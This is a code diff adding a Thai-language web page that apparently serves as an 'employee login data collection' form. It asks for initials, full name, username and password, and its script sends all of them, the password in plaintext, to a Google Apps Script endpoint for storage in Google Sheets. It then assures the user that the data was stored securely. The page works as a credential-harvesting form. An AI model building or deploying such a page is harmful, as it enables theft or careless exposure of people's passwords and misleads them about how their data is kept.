@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ระบบเก็บข้อมูลล็อกอินพนักงาน</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .security-info {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #2e7d32;
+        }
+        
+        .security-info .icon {
+            display: inline-block;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            background: #e8f5e8;
+            color: #2e7d32;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .error-message {
+            display: none;
+            background: #ffebee;
+            color: #c62828;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 ระบบเก็บข้อมูลล็อกอิน</h1>
+            <p>กรุณากรอกข้อมูลล็อกอินของคุณ</p>
+        </div>
+        
+
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="employeeId">ชื่อย่อ (Ex. KG)</label>
+                <input type="text" id="employeeId" name="employeeId" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="fullName">ชื่อ-นามสกุล</label>
+                <input type="text" id="fullName" name="fullName" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">ชื่อผู้ใช้ (Username)</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">รหัสผ่าน</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                ส่งข้อมูล
+            </button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>กำลังประมวลผลและส่งข้อมูล...</p>
+        </div>
+        
+        <div class="success-message" id="successMessage">
+            <h3>✅ ส่งข้อมูลสำเร็จ!</h3>
+            <p>ข้อมูลของคุณได้ถูกเก็บอย่างปลอดภัยแล้ว</p>
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            <h3>❌ เกิดข้อผิดพลาด!</h3>
+            <p id="errorText">ไม่สามารถส่งข้อมูลได้ กรุณาลองใหม่อีกครั้ง</p>
+        </div>
+    </div>
+
+    <script>
+        // กำหนดค่า Google Apps Script Web App URL
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';
+
+        // ฟังก์ชันส่งข้อมูลไป Google Sheets
+        async function sendToGoogleSheets(data) {
+            const response = await fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            
+            return await response.json();
+        }
+
+        // จัดการการส่งฟอร์ม
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const form = document.getElementById('loginForm');
+            
+            // ซ่อนข้อความเก่า
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            
+            // แสดง Loading
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            
+            try {
+                // รับข้อมูลจากฟอร์ม
+                const formData = new FormData(this);
+                const employeeId = formData.get('employeeId');
+                const fullName = formData.get('fullName');
+                const username = formData.get('username');
+                const password = formData.get('password');
+                
+                // เตรียมข้อมูลส่ง
+                const dataToSend = {
+                    timestamp: new Date().toISOString(),
+                    employeeId: employeeId,
+                    fullName: fullName,
+                    username: username,
+                    password: password
+                };
+                
+                // ส่งข้อมูลไป Google Sheets
+                const result = await sendToGoogleSheets(dataToSend);
+                
+                // แสดงข้อความสำเร็จ
+                loading.style.display = 'none';
+                successMessage.style.display = 'block';
+                form.reset();
+                
+                console.log('Data sent successfully:', result);
+                
+            } catch (error) {
+                // แสดงข้อความผิดพลาด
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+                document.getElementById('errorText').textContent = 'เกิดข้อผิดพลาด: ' + error.message;
+                
+                console.error('Error:', error);
+            } finally {
+                submitBtn.disabled = false;
+            }
+        });
+
+        // แจ้งเตือนถ้ายังไม่ได้ตั้งค่า Google Apps Script URL
+        if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE') {
+            alert('⚠️ กรุณาตั้งค่า Google Apps Script URL ในโค้ดก่อนใช้งาน');
+        }
+    </script>
+</body>
+</html>
